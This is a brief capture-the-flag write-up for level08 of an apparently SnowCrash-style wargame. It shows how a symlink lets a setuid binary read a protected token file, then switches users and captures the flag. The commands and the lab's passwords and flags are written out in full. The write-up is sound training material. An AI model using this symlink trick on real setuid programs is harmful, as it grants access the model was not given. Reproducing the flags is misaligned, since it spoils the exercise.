In this level we have 2 files, an executable level08 and a token that we're not able to read

ls -l

        -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
        -rw-------  1 flag08 flag08    26 Mar  5  2016 token

We can create a symlink race to be able to read the content in token file
(more informations about this on https://en.wikipedia.org/wiki/Symlink_race#:~:text=A%20symlink%20race%20is%20a,not%20otherwise%20accessible%20to%20them.)

ln -s /home/user/level08/token /tmp/pass

./level08 /tmp/pass

        quif5eloekouj29ke0vouxean

su flag08 -> quif5eloekouj29ke0vouxean
getflag

                           Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
